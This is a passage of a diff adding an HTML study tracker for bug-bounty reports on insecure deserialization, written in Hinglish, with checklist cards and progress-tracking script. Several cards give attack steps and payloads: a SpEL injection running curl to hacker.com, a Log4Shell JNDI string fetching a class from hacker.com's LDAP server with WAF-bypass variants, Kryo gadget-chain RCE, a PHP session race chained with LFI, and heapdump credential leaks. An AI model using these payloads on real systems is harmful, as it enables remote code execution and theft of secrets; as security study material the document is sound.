+                            class="c">#{T(Runtime).getRuntime().exec('curl hacker.com')}</code> → Route refresh kiya →
+                        Spring ne expression "Evaluate" kiya → Command execute! Ye technically Expression Language
+                        Injection hai par deserialization se closely related.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Actuator endpoints scan karo</strong> — <code
+                                class="c">/actuator</code>, <code class="c">/actuator/env</code>, <code
+                                class="c">/actuator/gateway/routes</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>SpEL expressions inject karo</strong> — <code
+                                class="c">#{T(Runtime).getRuntime().exec(...)}</code> try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Route add + refresh karo</strong> — POST se route add karo, phir
+                            <code class="c">/actuator/gateway/refresh</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Heapdump check karo</strong> — <code
+                                class="c">/actuator/heapdump</code> se credentials + secrets leak ho sakte hain.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #28 Kryo -->
+        <div class="report-card" data-severity="high" id="report-28">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #28 · BONUS · Total #317</div>
+                    <div class="report-title">Kryo Framework Deserialization — Custom Binary RCE</div>
+                    <div class="report-target">🎯 ██████ (Gaming Platform) · HackerOne · $3,500 · 9.0 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">Kryo</span><span
+                            class="technique-tag">Custom Binary</span><span
+                            class="technique-tag">setRegistrationRequired(false)</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Gaming platform Kryo library use kar rahi thi (Java standard
+                        serialization se fast). Developer ne <code class="c">setRegistrationRequired(false)</code> set
+                        kiya (any class accept) → Hacker ne Kryo-specific payload bheji → Custom binary format mein
+                        gadget chain → Server ne deserialize kiya → RCE on game server!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Kryo identify karo</strong> — Binary data jo standard Java (<code
+                                class="c">AC ED</code>) nahi hai par objects bhej raha = possible Kryo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Registration check karo</strong> — <code
+                                class="c">setRegistrationRequired(false)</code> hai? = Any class deserialize
+                            hogi.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Custom payloads banao</strong> — ysoserial kaam nahi karega,
+                            Kryo-specific serializer use karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #29 Log4Shell-style -->
+        <div class="report-card" data-severity="critical" id="report-29">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #29 · BONUS · Total #318</div>
+                    <div class="report-title">Log4Shell-Style JNDI Injection — Lookup Chain RCE</div>
+                    <div class="report-target">🎯 ██████ (Global SaaS) · HackerOne · $25,000 · 10.0 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">JNDI Lookup</span><span
+                            class="technique-tag">Log4j</span><span class="technique-tag">CVE-2021-44228</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Hacker ne header mein <code
+                            class="c">${jndi:ldap://hacker.com:1389/exploit}</code> inject kiya (User-Agent,
+                        X-Forwarded-For, anywhere that gets logged). Log4j ne JNDI lookup kiya → Hacker ke LDAP server
+                        se malicious Java class download hui → Server ne deserialize ki → Instant RCE. Internet par
+                        sabse devastating bug — millions affected!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Headers mein JNDI inject karo</strong> — User-Agent, Referer,
+                            X-Forwarded-For, Cookie — koi bhi logged field.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Bypass techniques try karo</strong> — <code
+                                class="c">${${lower:j}ndi:}</code>, <code class="c">${j${::-n}di:}</code> WAF bypass ke
+                            liye.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Multiple protocols test karo</strong> — <code
+                                class="c">ldap://</code>, <code class="c">rmi://</code>, <code class="c">dns://</code>
+                            (dns sabse safe detect ke liye).</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Form fields bhi test karo</strong> — Login forms, search bars,
+                            registration — jo bhi log hota hai.</span>
+                    </li>
+                </ul>
+                <div class="impact-box">
+                    <div class="impact-label">💥 IMPACT — THE NUCLEAR BUG</div>
+                    <div class="impact-text">Log4Shell (CVE-2021-44228) history ki sabse devastating vulnerability thi.
+                        Sirf ek header inject karke billions of servers hack kiye ja sakte the. Ye JNDI +
+                        Deserialization ka perfect combo hai.</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #30 PHP session.upload_progress -->
+        <div class="report-card" data-severity="high" id="report-30">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #30 · BONUS · Total #319</div>
+                    <div class="report-title">PHP Session Upload Progress — Race Condition to Deser RCE</div>
+                    <div class="report-target">🎯 ██████ (Shared Hosting) · HackerOne · $2,000 · 8.5 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">session.upload_progress</span><span
+                            class="technique-tag">Race Condition</span><span class="technique-tag">Session
+                            Handler</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">PHP ka <code class="c">session.upload_progress</code> feature enabled
+                        tha. File upload ke saath <code class="c">PHP_SESSION_UPLOAD_PROGRESS</code> parameter mein
+                        serialized payload inject kiya → PHP ne session file mein save kiya → Race condition exploit:
+                        session file delete hone se pehle LFI se include karaya → PHP ne session data deserialize kiya →
+                        <code class="c">__wakeup()</code> trigger → RCE!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>session.upload_progress check karo</strong> — PHP config mein
+                            enabled hai? Default mein on hota hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Session handler identify karo</strong> — Files based? Redis?
+                            Memcached? Method alag hoga.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Race condition exploit karo</strong> — Multipart upload + rapid
+                            session include = payload trigger before cleanup.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>LFI chain karo</strong> — Session file path: <code
+                                class="c">/tmp/sess_&lt;SESSIONID&gt;</code> par LFI through include karo.</span>
+                    </li>
+                </ul>
+                <div class="mindset-box">
+                    <div class="mindset-label">🧠 KEY TAKEAWAY</div>
+                    <div class="mindset-text">"Deserialization bugs aksar unexpected places mein milte hain — session
+                        handlers, upload progress, cache systems. Race conditions ke saath chain karo toh impact
+                        multiply ho jata hai."</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ FOOTER ═══ -->
+<footer class="mission-footer">
+    <p class="footer-text">⬡ MISSION 11 — INSECURE DESERIALIZATION MASTERY ⬡ 30 REPORTS ⬡ 7 PHASES ⬡ COMPLETE REGISTER ⬡
+    </p>
+</footer>
+
+<script>
+    const STORAGE_KEY = 'm11_deser_state';
+    function toggleItem(el) { el.classList.toggle('done'); saveState(); updateCardProgress(el.closest('.report-card')); updateMasterProgress() }
+    function updateCardProgress(card) { if (!card) return; const items = card.querySelectorAll('.checklist-item'), done = card.querySelectorAll('.checklist-item.done'); const pct = items.length ? Math.round((done.length / items.length) * 100) : 0; const p = card.querySelector('.card-progress-pct'), b = card.querySelector('.card-bar-fill'); if (p) p.textContent = pct + '%'; if (b) b.style.width = pct + '%' }
+    function updateMasterProgress() { const all = document.querySelectorAll('.checklist-item'), allD = document.querySelectorAll('.checklist-item.done'); const pct = all.length ? Math.round((allD.length / all.length) * 100) : 0; document.getElementById('masterPct').textContent = pct + '%'; document.getElementById('masterBar').style.width = pct + '%'; document.getElementById('completedItems').textContent = allD.length; let cc = 0; document.querySelectorAll('.report-card').forEach(c => { const t = c.querySelectorAll('.checklist-item').length, d = c.querySelectorAll('.checklist-item.done').length; if (t > 0 && t === d) cc++ }); document.getElementById('completedCards').textContent = cc;['phase1', 'phase2', 'phase3', 'phase4', 'phase5', 'phase6', 'phase7'].forEach((pid, i) => { const sec = document.getElementById(pid); if (!sec) return; const cards = sec.querySelectorAll('.report-card'), done = [...cards].filter(c => { const t = c.querySelectorAll('.checklist-item').length; return t > 0 && t === c.querySelectorAll('.checklist-item.done').length }); const el = document.getElementById('p' + (i + 1) + 'count'); if (el) el.textContent = done.length + ' / ' + cards.length + ' reports' }) }
+    function filterCards(type, btn) { document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active')); if (btn) btn.classList.add('active'); document.querySelectorAll('.report-card').forEach(card => { const sev = card.dataset.severity, items = card.querySelectorAll('.checklist-item'), doneItems = card.querySelectorAll('.checklist-item.done'); const isComplete = items.length > 0 && items.length === doneItems.length, isIncomplete = doneItems.length > 0 && !isComplete; let show = false; if (type === 'all') show = true; else if (type === 'critical') show = sev === 'critical'; else if (type === 'high') show = sev === 'high'; else if (type === 'medium') show = sev === 'medium'; else if (type === 'complete') show = isComplete; else if (type === 'incomplete') show = isIncomplete || doneItems.length === 0; card.style.display = show ? '' : 'none' }) }
+    function saveState() { const state = {}; document.querySelectorAll('.report-card').forEach(card => { const id = card.id, items = []; card.querySelectorAll('.checklist-item').forEach((item, i) => { if (item.classList.contains('done')) items.push(i) }); if (items.length) state[id] = items }); try { localStorage.setItem(STORAGE_KEY, JSON.stringify(state)) } catch (e) { } }
+    function loadState() { try { const raw = localStorage.getItem(STORAGE_KEY); if (!raw) return; const state = JSON.parse(raw); Object.keys(state).forEach(id => { const card = document.getElementById(id); if (!card) return; const items = card.querySelectorAll('.checklist-item'); state[id].forEach(i => { if (items[i]) items[i].classList.add('done') }); updateCardProgress(card) }) } catch (e) { } updateMasterProgress() }
+    loadState();
+</script>
+</body>
+
+</html>
